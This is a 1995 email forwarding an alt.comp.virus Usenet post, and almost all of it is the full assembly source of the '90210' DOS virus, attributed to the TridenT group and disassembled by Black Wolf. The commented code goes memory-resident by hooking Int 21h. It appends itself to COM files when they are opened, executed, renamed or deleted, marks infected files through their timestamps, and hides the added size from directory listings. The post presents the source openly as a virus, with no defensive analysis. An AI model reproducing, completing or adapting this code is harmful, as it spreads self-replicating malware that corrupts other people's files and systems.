From smtp Tue Feb  7 13:13 EST 1995
Received: from lynx.dac.neu.edu by POBOX.jwu.edu; Tue,  7 Feb 95 13:13 EST
Received: by lynx.dac.neu.edu (8.6.9/8.6.9) 
     id NAA30823 for joshuaw@pobox.jwu.edu; Tue, 7 Feb 1995 13:16:19 -0500
Date: Tue, 7 Feb 1995 13:16:19 -0500
From: lynx.dac.neu.edu!ekilby (Eric Kilby)
Content-Length: 8866
Content-Type: text
Message-Id: <199502071816.NAA30823@lynx.dac.neu.edu>
To: pobox.jwu.edu!joshuaw 
Subject: (fwd) 90210
Newsgroups: alt.comp.virus
Status: O

Path: chaos.dac.neu.edu!usenet.eel.ufl.edu!usenet.cis.ufl.edu!caen!uwm.edu!news.alpha.net!solaris.cc.vt.edu!uunet!ankh.iia.org!danishm
From: danishm@iia.org ()
Newsgroups: alt.comp.virus
Subject: 90210
Date: 5 Feb 1995 21:55:07 GMT
Organization: International Internet Association.
Lines: 345
Message-ID: <3h3hfr$sb@ankh.iia.org>
NNTP-Posting-Host: iia.org
X-Newsreader: TIN [version 1.2 PL2]

Here is the 90210 virus:

;90210 Virus from the TridenT virus research group.

;This is a semi-stealth virus that hides file-size changes while
;it is in memory.  It marks the files w/the timestamp.  It will
;infect COM files on open, execute, delete, and rename.  It checks
;if it is in memory by calling Int 21h with DEADh in AX and uses MCB's
;to go memory resident.

;Disassembly by Black Wolf

.model tiny  
.code

		org     100h
  
start:
		push    ax
		call    GetOffset

GetOffset:
		pop     bp
		sub     bp,offset GetOffset-start

		mov     ax,0DEADh
		int     21h                     ;Are we installed?
		cmp     ax,0AAAAh 
		je      DoneInstall

		mov     ax,3521h
		int     21h                     ;Get int 21 address
			   
    db      2eh, 89h,9eh,77h,0h     ;mov cs:[OldInt21-start+bp],bx
    db      2eh, 8ch, 86h, 79h, 0   ;mov word ptr cs:[OldInt21-start+2+bp],es

		mov     ax,cs
		dec     ax
		mov     ds,ax
		cmp     byte ptr ds:[0],'Z'
		jne     DoneInstall         ;Are we the last block in chain?
		
		mov     ax,ds:[3]               ;Get MCB size
		sub     ax,38h                  ;subtract virus memory size
		jc      DoneInstall             ;exit if virus > MCB

		mov     ds:[3],ax               ;Set MCB size
		;sub     word ptr ds:[12h],38h  ;Subtract virus mem from 
		db      81h,2eh,12h,0,38h,0     ;top of memory in PSP
		
		mov     si,bp
		mov     di,0
		mov     es,ds:[12h]             ;Get top of memory from PSP
		push    cs
		pop     ds
		mov     cx,287h
		cld          
		rep     movsb                   ;Copy virus into memory
		
		mov     ax,2521h        
		push    es
		pop     ds
		mov     dx,offset Int21Handler-start
		int     21h                     ;Set int 21h
			   
DoneInstall:
		mov     di,100h
		lea     si,[bp+Storage_Bytes-start]
		push    cs
		push    cs
		pop     ds
		pop     es
		cld 
		movsw
		movsb                           ;Restore Host file.
		mov     bx,offset start
		pop     ax
		push    bx
		retn                            ;Return to Host

  
VirusName       db      '[90210 BH]'
		
OldInt21:                
		dw      0                
		dw      0
		
Int21Handler:
		cmp     ax,0DEADh               ;Install Check?
		jne     NotInstall   
		mov     ax,0AAAAh
		iret 
NotInstall:

		cmp     ah,11h                  ;FCB find first
		je      FCBSearch
		cmp     ah,12h                  ;FCB find next
		je      FCBSearch
		cmp     ah,4Eh                  ;handle find first
		je      HandleSearch
		cmp     ah,4Fh                  ;handle find next
		je      HandleSearch
		
		push    ax bx cx dx si di bp ds es

		cmp     ah,3Dh                  ;handle file open
		je      SetupNameCheck
		cmp     ax,4B00h                ;file execute
		je      SetupNameCheck
		cmp     ah,41h                  ;handle file delete
		je      SetupNameCheck
		cmp     ah,43h                  ;get/set attributes
		je      SetupNameCheck
		cmp     ah,56h                  ;rename file
		je      SetupNameCheck
		
		cmp     ah,0Fh                  ;Open file w/FCB
		je      TryToInfect
		cmp     ah,23h
		je      TryToInfect             ;Get file size
		jmp     ExitInfect
		
FCBSearch:
		jmp     FCBStealth
HandleSearch:
		jmp     HandleStealth

TryToInfect:
		db      89h,0d6h         ;mov     si,dx

		inc     si
		push    cs
		pop     es
		mov     di,offset ds:[Filename-start]     ;Copy filename
		mov     cx,8
		rep     movsb
		mov     cx,3
		inc     di
		rep     movsb

		mov     dx,Filename-start
		push    cs
		pop     ds

SetupNameCheck:
		db      89h, 0d6h        ;mov     si,dx
		mov     cx,100h
		cld 
  
Find_Extension:
		lodsb
		cmp     al,'.'                  ;Find '.'
		je      CheckFilename
		loop    Find_Extension
		db      0e9h, 13h, 0             ;jmp     FilenameBad
CheckFilename:
		lodsw 
		or      ax,2020h                ;Set to lowercase
		cmp     ax,6F63h                ;Is it a com file?
		jne     FilenameBad
		lodsb        
		or      al,20h
		cmp     al,6Dh
		jne     FilenameBad
		db      0e9h, 3, 0              ;jmp     InfectFile 

FilenameBad:
		jmp     ExitInfect 

InfectFile:
		push    dx
		push    ds
		mov     ax,4300h
		pushf         
		call    dword ptr cs:[OldInt21-start]      ;Get Attributes
		mov     word ptr cs:[FileAttribs-start],cx ;Save them
		
		mov     ax,4301h
		xor     cx,cx
		pushf           
		call    dword ptr cs:[OldInt21-start]     ;Reset Attribs to 0
		
		mov     ax,3D02h
		pushf
		call    dword ptr cs:[OldInt21-start]     ;Open file
		jnc     OpenGood
		jmp     FileClosed

OpenGood:
		xchg    ax,bx
		mov     ax,5700h
		pushf              
		call    dword ptr cs:[OldInt21-start]      ;Get file time/date
		mov     word ptr cs:[FileTime-start],cx  ;save time
		mov     word ptr cs:[FileDate-start],dx  ;save date

		and     cx,1Fh
		cmp     cx,1Fh
		jne     NotInfected                    ;Check infection
		db      0e9h, 76h, 0                   ;jmp     Close_File
NotInfected:
		mov     ah,3Fh                  
		push    cs
		pop     ds
		mov     dx,Storage_Bytes-start
		mov     cx,3
		pushf                          
		call    dword ptr cs:[OldInt21-start] ;Read in first 3 bytes

		cmp     word ptr cs:[Storage_Bytes-start],5A4Dh    
		je      DoneWithFile        ;Is it an .EXE file?

		cmp     word ptr cs:[Storage_Bytes-start],4D5Ah
		je      DoneWithFile        ;Alternate EXE sig?

		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx
		pushf        
		call    dword ptr cs:[OldInt21-start] ;Go end of file.
		
		sub     ax,3                        ;Save jump size
		mov     word ptr cs:[Jump_Bytes-start+1],ax
		
		mov     ah,40h                  
		push    cs
		pop     ds
		mov     dx,0
		mov     cx,287h
		pushf          
		call    dword ptr cs:[OldInt21-start] ;Append virus to file
		
		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx
		int     21h                          ;go back to beginning
			   
		mov     ah,40h                  
		mov     dx,Jump_Bytes-Start
		mov     cx,3
		pushf        
		call    dword ptr cs:[OldInt21-start]      ;Write in jump
		or      word ptr cs:[FileTime-start],1Fh ;Mark as infected

DoneWithFile:
		mov     ax,5701h
		mov     cx,word ptr cs:[FileTime-start]   
		mov     dx,word ptr cs:[FileDate-start]   
		pushf                               
		call    dword ptr cs:[OldInt21-start] ;Restore File Date/Time

Close_File:
		mov     ah,3Eh
		pushf          
		call    dword ptr cs:[OldInt21-start] ;Close file
		
		pop     ds
		pop     dx                          ;Pop filename address
		push    dx
		push    ds
		mov     ax,4301h
		mov     cx,ds:[FileAttribs-start]
		pushf             
		call    dword ptr cs:[OldInt21-start]    ;Restore attributes

FileClosed:
		pop     ds
		pop     dx

ExitInfect:
		pop     es ds bp di si dx cx bx ax
		jmp     dword ptr cs:[OldInt21-start]  ;Jump back into Int 21h
  
GetDTA:
		pop     si
		pushf
		push    ax bx es
		mov     ah,2Fh
		call    CallInt21
		jmp     si

FCBStealth:
		call    CallInt21
		cmp     al,0                    ;Did call work?
		jne     NoStealth
		call    GetDTA
		cmp     byte ptr es:[bx],0FFh   ;Extended FCB?
		jne     AfterFCBAdjust
		add     bx,8

AfterFCBAdjust:
		mov     al,es:[bx+16h]          ;Get time stamp
		and     al,1Fh
		cmp     al,1Fh                  ;infected?
		jne     DoneFCBStealth

		sub     word ptr es:[bx+1Ch],287h ;Subtract virus size
		sbb     word ptr es:[bx+1Eh],0    ;adjust for carry
		jmp     short ResetTime

HandleStealth:
		call    CallInt21
		jc      NoStealth 
		call    GetDTA      
		mov     al,es:[bx+16h]              ;Get file time
		and     al,1Fh
		cmp     al,1Fh
		jne     DoneFCBStealth
		sub     word ptr es:[bx+1Ah],287h   ;Subtract virus size
		sbb     word ptr es:[bx+1Ch],0      ;adjust for carry

ResetTime:
		xor     byte ptr es:[bx+16h],10h    ;Restore time to norm.

DoneFCBStealth:
		pop     es bx ax
		popf
  
NoStealth:
		retf    2 

CallInt21:
		pushf
		call    dword ptr cs:[OldInt21-start]
		retn

Storage_Bytes:                
		nop
		int     21h
		
Filename        db      8 dup (0)
		db      '.'
Extension       db      3 dup (0)
		db      0

FileAttribs     dw      0
FileTime        dw      0
FileDate        dw      0

Jump_Bytes      db      0E9h, 00h, 00h

AuthorName      db      ' John Tardy / TridenT '

end     start


--
Eric "Mad Dog" Kilby                                 maddog@ccs.neu.edu
The Great Sporkeus Maximus			     ekilby@lynx.dac.neu.edu
Student at the Northeatstern University College of Computer Science 
"I Can't Believe It's Not Butter"

